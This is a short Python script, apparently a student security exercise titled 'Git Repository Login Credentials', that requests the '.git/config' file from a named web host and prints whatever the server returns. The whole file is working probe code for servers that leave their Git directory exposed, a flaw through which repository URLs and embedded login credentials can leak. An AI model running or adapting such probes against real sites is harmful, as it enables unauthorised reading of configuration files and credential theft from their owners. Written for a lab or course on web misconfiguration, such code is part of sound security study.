#Git Repository Login Credentials
#Rehaan Lachporia - 101594859
import urllib.request

target = "https://git.0x10.cloud/"
path = ".git/config"

try:
    response = urllib.request.urlopen(f"{target}{path}")
    print(response.status)
    print(response.read().decode())

except Exception as e:
    print(e)